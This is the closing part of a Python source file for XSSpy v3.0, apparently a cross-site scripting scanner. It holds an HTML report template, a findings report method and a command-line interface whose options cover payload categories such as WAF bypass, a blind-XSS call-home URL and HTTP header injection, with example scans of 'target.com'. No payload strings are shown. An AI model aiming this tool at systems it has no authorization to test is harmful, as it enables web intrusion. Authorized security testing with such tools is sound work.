.arr{{color:var(--tx3);font-size:12px;transition:transform .2s;user-select:none}}
.arr.open{{transform:rotate(180deg)}}
.card-body{{padding:14px 16px 16px;border-top:1px solid var(--b1)}}
.card-body.h{{display:none}}
.g2{{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px}}
.fld{{display:flex;flex-direction:column;gap:4px}}
.fld.full{{margin-top:8px}}
.fld label{{font-size:9.5px;font-weight:700;letter-spacing:1.5px;
  text-transform:uppercase;color:var(--tx3)}}
.fld code{{font-family:'JetBrains Mono',monospace;font-size:11.5px;color:var(--tx);
  background:var(--bg);padding:6px 10px;border-radius:4px;
  border:1px solid var(--b1);word-break:break-all;line-height:1.5}}
.cu{{color:var(--cy)!important}}
.cp{{color:var(--acc)!important}}
.ce{{color:var(--tx2)!important;font-size:10.5px!important}}
.no-findings{{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--tx3);
  padding:40px;text-align:center;border:1px dashed var(--b2);border-radius:8px}}
 
/* ── FOOTER ── */
.ftr{{position:relative;z-index:5;padding:18px 56px;border-top:1px solid var(--b1);
  background:var(--bg2);display:flex;justify-content:space-between;align-items:center}}
.fl{{font-family:'JetBrains Mono',monospace;font-size:10.5px;color:var(--tx3)}}
.fl span{{color:var(--acc)}}
.fr{{font-size:10.5px;color:var(--tx3)}}
 
/* scrollbar */
::-webkit-scrollbar{{width:5px}}
::-webkit-scrollbar-track{{background:var(--bg)}}
::-webkit-scrollbar-thumb{{background:var(--b2);border-radius:3px}}
::-webkit-scrollbar-thumb:hover{{background:var(--acc)}}
 
@media(max-width:860px){{
  .hdr,.ftr{{padding:22px}}
  .strip{{grid-template-columns:repeat(3,1fr)}}
  .main{{padding:22px}}
  .tabs{{padding:0 22px}}
  .risk{{padding:12px 22px}}
  .ov-grid{{grid-template-columns:1fr}}
  .ascii{{display:none}}
  .ftr{{flex-direction:column;gap:6px;text-align:center}}
}}
</style>
</head>
<body>
 
<header class="hdr">
  <div class="hdr-glow"></div>
  <div class="hdr-inner">
    <div class="logo-wrap">
      <div class="ascii"> ██╗  ██╗███████╗███████╗
 ╚██╗██╔╝██╔════╝██╔════╝
  ╚███╔╝ ███████╗███████╗
  ██╔██╗ ╚════██║╚════██║
 ██╔╝ ██╗███████║███████║
 ╚═╝  ╚═╝╚══════╝╚══════╝</div>
      <div>
        <div class="title">XSSpy v3.0</div>
        <div class="sub">XSS Detection &amp; Analysis Tool</div>
        <div class="author">✦ Created by Prince Roy</div>
      </div>
    </div>
    <div class="hdr-meta">
      <div>SCAN DATE &nbsp;<span>{ts}</span></div>
      <div>TOOL &nbsp;<span>XSSpy v3.0</span></div>
      <div>PURPOSE &nbsp;<span>Authorized Testing Only</span></div>
    </div>
  </div>
</header>
 
<div class="strip">
  <div class="sc"><div class="sl">Total Findings</div><div class="sv {'r' if total > 0 else 'd'}">{total}</div></div>
  <div class="sc"><div class="sl">High</div><div class="sv {'r' if high else 'd'}">{len(high)}</div></div>
  <div class="sc"><div class="sl">Medium</div><div class="sv {'y' if medium else 'd'}">{len(medium)}</div></div>
  <div class="sc"><div class="sl">URLs Scanned</div><div class="sv c">{stats.urls_scanned}</div></div>
  <div class="sc"><div class="sl">Payloads Fired</div><div class="sv c">{stats.payloads_sent}</div></div>
  <div class="sc"><div class="sl">Elapsed</div><div class="sv d">{stats.elapsed()}</div></div>
</div>
 
<div class="risk">
  <span class="rl">RISK LEVEL</span>
  <div class="rb"><div class="rf" id="rf" style="width:0%"></div></div>
  <span class="rs">{risk_label}</span>
</div>
 
<div class="tabs">
  <button class="tb on" onclick="sw('ov',this)">Overview</button>
  <button class="tb" onclick="sw('hi',this)">High <span class="tc {'d' if not high else ''}">{len(high)}</span></button>
  <button class="tb" onclick="sw('me',this)">Medium <span class="tc y {'d' if not medium else ''}">{len(medium)}</span></button>
  <button class="tb" onclick="sw('lo',this)">Low <span class="tc d">{len(low)}</span></button>
  <button class="tb" onclick="sw('al',this)">All <span class="tc {'d' if not findings else ''}">{total}</span></button>
</div>
 
<main class="main">
 
  <div id="t-ov" class="pnl on">
    <div class="ov-grid">
      <div class="ov-card">
        <h3>Severity Breakdown</h3>
        <div class="sr"><div class="dot h"></div><span class="sn">High</span><span class="sv2 h">{len(high)}</span></div>
        <div class="sr"><div class="dot m"></div><span class="sn">Medium</span><span class="sv2 m">{len(medium)}</span></div>
        <div class="sr"><div class="dot l"></div><span class="sn">Low</span><span class="sv2 l">{len(low)}</span></div>
      </div>
      <div class="ov-card">
        <h3>Scan Metadata</h3>
        <div class="mr"><span class="mk">URLs Scanned</span><span class="mv">{stats.urls_scanned}</span></div>
        <div class="mr"><span class="mk">Forms Found</span><span class="mv">{stats.forms_found}</span></div>
        <div class="mr"><span class="mk">Params Tested</span><span class="mv">{stats.params_tested}</span></div>
        <div class="mr"><span class="mk">Payloads Sent</span><span class="mv">{stats.payloads_sent}</span></div>
        <div class="mr"><span class="mk">Errors</span><span class="mv">{stats.errors}</span></div>
        <div class="mr"><span class="mk">Duration</span><span class="mv">{stats.elapsed()}</span></div>
      </div>
    </div>
  </div>
 
  <div id="t-hi" class="pnl">
    <div class="sec-hdr">
      <span class="sec-title" style="color:var(--rd)">High Severity</span>
      <div class="sec-line"></div>
      <span class="sec-cnt">{len(high)} findings</span>
    </div>
    {finding_cards(high)}
  </div>
 
  <div id="t-me" class="pnl">
    <div class="sec-hdr">
      <span class="sec-title" style="color:var(--yw)">Medium Severity</span>
      <div class="sec-line"></div>
      <span class="sec-cnt">{len(medium)} findings</span>
    </div>
    {finding_cards(medium)}
  </div>
 
  <div id="t-lo" class="pnl">
    <div class="sec-hdr">
      <span class="sec-title">Low Severity</span>
      <div class="sec-line"></div>
      <span class="sec-cnt">{len(low)} findings</span>
    </div>
    {finding_cards(low)}
  </div>
 
  <div id="t-al" class="pnl">
    <div class="sec-hdr">
      <span class="sec-title">All Findings</span>
      <div class="sec-line"></div>
      <span class="sec-cnt">{total} total</span>
    </div>
    {finding_cards(findings)}
  </div>
 
</main>
 
<footer class="ftr">
  <div class="fl">XSSpy v3.0 &nbsp;·&nbsp; <span>Created by Prince Roy</span> &nbsp;·&nbsp; Authorized Testing Only</div>
  <div class="fr">Generated: {ts}</div>
</footer>
 
<script>
function sw(id,btn){{
  document.querySelectorAll('.pnl').forEach(p=>p.classList.remove('on'));
  document.querySelectorAll('.tb').forEach(b=>b.classList.remove('on'));
  document.getElementById('t-'+id).classList.add('on');
  btn.classList.add('on');
}}
function tog(hdr){{
  const body=hdr.nextElementSibling;
  const arr=hdr.querySelector('.arr');
  body.classList.toggle('h');
  arr.classList.toggle('open');
}}
window.addEventListener('load',()=>{{
  setTimeout(()=>{{document.getElementById('rf').style.width='{risk}%';}},120);
}});
</script>
</body>
</html>"""
 
    # ── Reporting ─────────────────────────────────────────────────
    def report(self, output=None, fmt: str = "text", html_output=None):
        stats    = self.stats
        findings = self.findings
 
        high   = [f for f in findings if f.severity == "HIGH"]
        medium = [f for f in findings if f.severity == "MEDIUM"]
        low    = [f for f in findings if f.severity == "LOW"]
 
        sep = "═" * 65
        lines = [
            f"\n{C.BOLD}{sep}{C.RESET}",
            f"  {C.BOLD}XSSpy v3.0 — Scan Report{C.RESET}",
            f"  {C.DIM}Created by Prince Roy{C.RESET}",
            sep,
            f"  URLs scanned    : {stats.urls_scanned}",
            f"  Forms found     : {stats.forms_found}",
            f"  Params tested   : {stats.params_tested}",
            f"  Payloads sent   : {stats.payloads_sent}",
            f"  Elapsed         : {stats.elapsed()}",
            f"  Errors          : {stats.errors}",
            sep,
        ]
 
        if findings:
            lines.append(
                f"  {C.RED}HIGH{C.RESET} {len(high)}  "
                f"{C.YELLOW}MEDIUM{C.RESET} {len(medium)}  "
                f"{C.DIM}LOW{C.RESET} {len(low)}  "
                f"— {C.BOLD}{len(findings)} total{C.RESET}"
            )
            lines.append(sep)
            for i, f in enumerate(findings, 1):
                sc = C.RED if f.severity == "HIGH" else (C.YELLOW if f.severity == "MEDIUM" else C.DIM)
                lines += [
                    f"\n  {C.BOLD}Finding #{i}{C.RESET}",
                    f"    Type       : {f.vuln_type}",
                    f"    Severity   : {sc}{f.severity}{C.RESET}",
                    f"    Confidence : {f.confidence}",
                    f"    Method     : {f.method}",
                    f"    URL        : {f.url}",
                    f"    Parameter  : {C.CYAN}{f.parameter}{C.RESET}",
                    f"    Context    : {f.context}",
                    f"    Payload    : {C.DIM}{f.payload[:100]}{C.RESET}",
                ]
                if f.evidence:
                    lines.append(f"    Evidence   : {C.DIM}{f.evidence.replace(chr(10),' ')[:120]}{C.RESET}")
                lines.append(f"    Timestamp  : {f.timestamp}")
        else:
            lines.append(f"  {C.GREEN}No XSS vulnerabilities found.{C.RESET}")
 
        lines.append(f"\n{sep}\n")
        report_text = "\n".join(lines)
        print(report_text)
 
        if output:
            clean = re.sub(r"\033\[[0-9;]*m", "", report_text)
            if fmt == "json":
                data = {
                    "scan_meta": {
                        "timestamp":     datetime.utcnow().isoformat(),
                        "author":        "Prince Roy",
                        "urls_scanned":  stats.urls_scanned,
                        "payloads_sent": stats.payloads_sent,
                        "elapsed":       stats.elapsed(),
                    },
                    "findings": [asdict(f) for f in findings],
                }
                Path(output).write_text(json.dumps(data, indent=2), encoding="utf-8")
            else:
                Path(output).write_text(clean, encoding="utf-8")
            print(C.ok(f"Report saved  → {output}"))
 
        if html_output:
            html = self._generate_html_report(stats, findings)
            Path(html_output).write_text(html, encoding="utf-8")
            print(C.ok(f"HTML report   → {html_output}"))
 
 
# ─────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="xsspy",
        description="XSSpy v3.0 — Advanced XSS Detection Tool | Created by Prince Roy",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Examples:
  xsspy.py -u "https://target.com/search?q=test"
  xsspy.py -u "https://target.com" -c basic,filter_bypass --dom -v
  xsspy.py -f urls.txt -t 10 -o results.json --format json --html report.html
  xsspy.py -u "https://target.com" --cookie "session=abc123" --proxy http://127.0.0.1:8080 -v
  xsspy.py -u "https://target.com" --blind-url https://your-hook.server/x -v --html out.html
"""
    )
 
    tgt = p.add_argument_group("Target")
    tgt.add_argument("-u","--url",  help="Single URL to scan")
    tgt.add_argument("-f","--file", help="File with one URL per line")
 
    pay = p.add_argument_group("Payloads")
    pay.add_argument("-p","--payloads", metavar="FILE", help="Custom payload file (one per line)")
    pay.add_argument("-c","--categories", metavar="CATS",
                     help="Comma-separated: basic,attribute,filter_bypass,dom,polyglot,waf_bypass")
    pay.add_argument("--blind-url", metavar="URL", help="Blind XSS call-home URL")
 
    mode = p.add_argument_group("Scan Modes")
    mode.add_argument("--dom",             action="store_true", help="DOM sink static analysis")
    mode.add_argument("--scan-headers",    action="store_true", help="Inject into HTTP headers")
    mode.add_argument("--continue-on-find",action="store_true", help="Keep testing after first hit per param")
 
    http = p.add_argument_group("HTTP")
    http.add_argument("--cookie",       help="Cookie string: \"name=val; name2=val2\"")
    http.add_argument("--cookie-jar",   metavar="FILE", help="Netscape cookies.txt file")
    http.add_argument("--auth",         metavar="USER:PASS", help="HTTP Basic auth")
    http.add_argument("-H","--header",  action="append", dest="headers", default=[], metavar="HEADER",
                      help="Extra header (repeatable): \"X-Foo: bar\"")
    http.add_argument("--proxy",        help="HTTP proxy: http://127.0.0.1:8080")
    http.add_argument("--user-agent",   help="Custom User-Agent string")
    http.add_argument("--timeout",      type=float, default=10, help="Request timeout seconds (default:10)")
    http.add_argument("--no-ssl-verify",action="store_true", help="Disable SSL certificate verification")
    http.add_argument("--delay",        type=float, default=0, help="Delay between requests (default:0)")
 
    perf = p.add_argument_group("Performance")
    perf.add_argument("-t","--threads", type=int, default=5, help="Threads (default:5)")
 
    out = p.add_argument_group("Output")
    out.add_argument("-o","--output",  metavar="FILE", help="Save text/JSON report to file")
    out.add_argument("--format",       choices=["text","json"], default="text",
                     help="Report format: text or json")
    out.add_argument("--html",         metavar="FILE", help="Save premium HTML report to file")
    out.add_argument("-v","--verbose", action="store_true",
                     help="Show every payload attempt and injection result live")
 
    return p
 
 
def main():
    print(BANNER)
    parser = build_parser()
    args   = parser.parse_args()
 
    if not args.url and not args.file:
        parser.print_help()
        sys.exit(1)
 
    urls = []
    if args.url:
        urls.append(args.url.strip())
    if args.file:
        try:
            urls += [l.strip() for l in Path(args.file).read_text().splitlines()
                     if l.strip() and not l.startswith("#")]
        except FileNotFoundError:
            print(C.err(f"URL file not found: {args.file}"))
            sys.exit(1)
 
    cats = [c.strip() for c in args.categories.split(",")] if args.categories else []
 
    config = {
        "threads":            args.threads,
        "timeout":            args.timeout,
        "payload_file":       args.payloads,
        "payload_categories": cats,
        "blind_url":          args.blind_url,
        "dom":                args.dom,
        "scan_headers":       args.scan_headers,
        "continue_on_find":   args.continue_on_find,
        "cookie":             args.cookie,
        "cookie_jar":         args.cookie_jar,
        "auth":               args.auth,
        "headers":            args.headers,
        "proxy":              args.proxy,
        "user_agent":         args.user_agent,
        "no_ssl_verify":      args.no_ssl_verify,
        "delay":              args.delay,
        "verbose":            args.verbose,
    }
 
    print(C.info(f"Threads       : {args.threads}"))
    print(C.info(f"Timeout       : {args.timeout}s"))
    print(C.info(f"Targets       : {len(urls)}"))
    print(C.info(f"DOM analysis  : {args.dom}"))
    print(C.info(f"Header inject : {args.scan_headers}"))
    print(C.info(f"Verbose mode  : {args.verbose}"))
    print(C.info(f"HTML report   : {args.html or 'disabled'}"))
    print(C.info(f"Started       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"))
    print("─" * 65)
 
    scanner = XSSScanner(config)
    scanner.run(urls)
    scanner.report(output=args.output, fmt=args.format, html_output=args.html)
 
 
if __name__ == "__main__":
    main()
